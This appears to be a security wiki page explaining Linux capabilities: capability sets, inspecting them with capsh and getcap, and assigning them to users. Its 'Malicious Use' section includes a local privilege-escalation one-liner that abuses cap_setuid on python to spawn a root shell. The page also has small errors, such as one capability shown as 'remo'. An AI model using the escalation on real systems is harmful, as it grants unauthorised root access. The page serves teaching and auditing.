# Linux Capabilities

## Capabilities

Normally the root user \(or any ID with UID of 0\) gets a special treatment when running processes. The kernel and applications are usually programmed to skip the restriction of some activities when seeing this user ID. In other words, this user is allowed to do \(almost\) anything.

Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation.

### Why capabilities?

To better understand how Linux capabilities work, let’s have a look first at the problem it tries to solve.

Let’s assume we are running a process as a normal user. This means we are non-privileged. We can only access data that owned by us, our group, or which is marked for access by all users. At some point in time, our process needs a little bit more permissions to fulfill its duties, like opening a network socket. The problem is that normal users can not open a socket, as this requires root permissions.

### List Capabilities

```bash
#You list all the capabilities with
capsh --print
```

**Here you can find some capabilities with short descriptions**

| Capabilities name | Description |
| :--- | :--- |
| CAP\_AUDIT\_CONTROL | Allow to enable/disable kernel auditing |
| CAP\_AUDIT\_WRITE | Helps to write records to kernel auditing log |
| CAP\_BLOCK\_SUSPEND | This feature can block system suspends |
| **CAP\_CHOWN** | Allow user to make arbitrary change to files UIDs and GIDs \(full filesystem access\) |
| **CAP\_DAC\_OVERRIDE** | This helps to bypass file read, write and execute permission checks \(full filesystem access\) |
| **CAP\_DAC\_READ\_SEARCH** | This only bypass file and directory read/execute permission checks |
| CAP\_FOWNER | This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file |
| CAP\_KILL | Allow the sending of signals to processes belonging to others |
| CAP\_SETGID | Allow changing of the GID |
| **remo** | Allow changing of the UID \(set UID of root in you process\) |
| CAP\_SETPCAP | Helps to transferring and removal of current set to any PID |
| CAP\_IPC\_LOCK | This helps to lock memory |
| CAP\_MAC\_ADMIN | Allow MAC configuration or state changes |
| CAP\_NET\_RAW | Use RAW and PACKET sockets |
| CAP\_NET\_BIND\_SERVICE | SERVICE Bind a socket to internet domain privileged ports |
| CAP\_SYS\_CHROOT | Ability to call chroot\(\) |

### Capabilities Sets

#### Inherited capabilities

**CapEff**: The _effective_ capability set represents all capabilities the process is using at the moment \(this is the actual set of capabilities that the kernel uses for permission checks\). For file capabilities the effective set is in fact a single bit indicating whether the capabilities of the permitted set will be moved to the effective set upon running a binary. This makes it possible for binaries that are not capability-aware to make use of file capabilities without issuing special system calls.

**CapPrm**: \(_Permitted_\) This is a superset of capabilities that the thread may add to either the thread permitted or thread inheritable sets. The thread can use the capset\(\) system call to manage capabilities: It may drop any capability from any set, but only add capabilities to its thread effective and inherited sets that are in its thread permitted set. Consequently it cannot add any capability to its thread permitted set, unless it has the cap\_setpcap capability in its thread effective set.

**CapInh**: Using the _inherited_ set all capabilities that are allowed to be inherited from a parent process can be specified. This prevents a process from receiving any capabilities it does not need. This set is preserved across an `execve` and is usually set by a process _receiving_ capabilities rather than by a process that’s handing out capabilities to its children.

**CapBnd**: With the _bounding_ set it’s possible to restrict the capabilities a process may ever receive. Only capabilities that are present in the bounding set will be allowed in the inheritable and permitted sets.

**CapAmb**: The _ambient_ capability set applies to all non-SUID binaries without file capabilities. It preserves capabilities when calling `execve`. However, not all capabilities in the ambient set may be preserved because they are being dropped in case they are not present in either the inheritable or permitted capability set. This set is preserved across `execve` calls.

For a detailed explanation of the difference between capabilities in threads and files and how are the capabilities  passed to threads read the following pages:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Processes Capabilities

To see the capabilities for a particular process, use the **status** file in the /proc directory. As it provides more details, let’s limit it only to the information related to Linux capabilities.  
Note that for all running processes capability information is maintained per thread, for binaries in the file system it’s stored in extended attributes.

```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```

This command should return 5 lines on most systems.

* CapInh = Inherited capabilities
* CapPrm = Permitted capabilities
* CapEff = Effective capabilities
* CapBnd = Bounding set
* CapAmb = Ambient capabilities set

```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```

These hexadecimal numbers don’t make sense. Using the capsh utility we can decode them into the capabilities name.

```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```

Lets check now the **capabilities** used by `ping`:

```bash
cat /proc/9491/status | grep Cap
CapInh:	0000000000000000
CapPrm:	0000000000003000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Although that works, there is another and easier way. To see the capabilities of a running process, simply use the **getpcaps** tool followed by its process ID \(PID\). You can also provide a list of process IDs.

```bash
getpcaps 1234
```

Lets check here the capabilities of `tcpdump` after having giving the binary enough capabilities \(`cap_net_admin` and `cap_net_raw`\) to sniff the network \(_tcpdump is running in process 9562_\):

```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:	0000000000000000
CapPrm:	0000000000003000
CapEff:	0000000000003000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

As you can see the given capabilities corresponds with the results of the 2 ways of getting the capabilities of a binary.  
The _getpcaps_ tool uses the **capget\(\)** system call to query the available capabilities for a particular thread. This system call only needs to provide the PID to obtain more information.

### Dropping capabilities with capsh

If we drop the CAP\_NET\_RAW capabilities for _ping_, then the ping utility should no longer work.

```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```

Besides the output of _capsh_ itself, the _tcpdump_ command itself should also raise an error.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

The error clearly shows that the ping command is not allowed to open an ICMP socket. Now we know for sure that this works as expected.

### Remove Capabilities

You can remove capabilities of a binary with

```bash
setcap -r </path/to/binary>
```

## User Capabilities

Apparently **it's possible to assign capabilities also to users**. This probably means that every process executed by the user will be able to use the users capabilities.  
Base on on [this](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [this ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)and [this ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)a few files new to be configured to give a user certain capabilities but the one assigning the capabilities to each user will be `/etc/security/capability.conf`.  
File example:

```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```

## Malicious Use

Capabilities are useful when you **want to restrict your own processes after performing privileged operations** \(e.g. after setting up chroot and binding to a socket\). However, they can be exploited by passing them malicious commands or arguments which are then run as root.

You can force capabilities upon programs using `setcap`, and query these using `getcap`:

```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```

The `+ep` means you’re adding the capability \(“-” would remove it\) as Effective and Permitted.

To identify programs in a system or folder with capabilities:

```bash
getcap -r / 2>/dev/null
```

### Exploitation example

In the following example the binary `/usr/bin/python2.6` is found vulnerable to privesc:

```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

**Capabilities** needed by `tcpdump` to **allow any user to sniff packets**:

```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```

### The special case of "empty" capabilities

Note that one can assign empty capability sets to a program file, and thus it is possible to create a set-user-ID-root program that changes the effective and saved set-user-ID of the process that executes the program to 0, but confers no capabilities to that process. Or, simply put, if you have a binary that:

1. is not owned by root
2. has no `SUID`/`SGID` bits set
3. has empty capabilities set \(e.g.: `getcap myelf` returns `myelf =ep`\)

then that binary will run as root.

## References

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/\#:~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* 
